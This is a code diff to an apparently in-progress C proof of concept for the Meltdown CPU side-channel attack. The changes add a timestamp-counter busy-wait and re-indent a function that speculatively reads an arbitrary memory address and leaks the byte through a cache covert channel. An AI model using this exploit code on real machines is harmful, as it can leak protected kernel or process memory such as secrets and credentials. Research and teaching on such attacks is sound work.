@@ -28,6 +28,12 @@ static void *cc_buffer;
 static size_t cc_buf_size = 256 * 4096; // 256 cache lines, 4096 bytes apart (mem pages)
 static u64 threshold = 40;
 
+static void wait(uint64_t cycles) {
+	unsigned int ignore;
+	uint64_t start = __rdtscp(&ignore);
+	while (__rdtscp(&ignore) - start < cycles);
+}
+
 static inline void maccess(void *p) {
     asm volatile("mov eax, [%0]\n" : : "c"(p) : "eax");
 }
@@ -94,13 +100,13 @@ static int cc_receive() {
 // --------------------------------------------------
 
 static void meltdown(uintptr_t adrs) {
-  volatile int tmp = 0;
-  cc_setup();
-  _mm_lfence();
-  tmp += 17;
-  tmp *= 59;
-  uint8_t rv = *((uint8_t *)adrs);
-  cc_transmit(rv);
+    volatile int tmp = 0;
+    cc_setup();
+    _mm_lfence();
+    tmp += 17;
+    tmp *= 59;
+    uint8_t rv = *((uint8_t *)adrs);
+    cc_transmit(rv);
 }
 
 
@@ -113,6 +119,7 @@ static int do_meltdown(uintptr_t adrs) {
 
 #ifdef MELTDOWNCASE
 int main(){
+    wait(1E9);
     printf("TODO\n");
     cc_init();
     uint8_t test_num = 8;
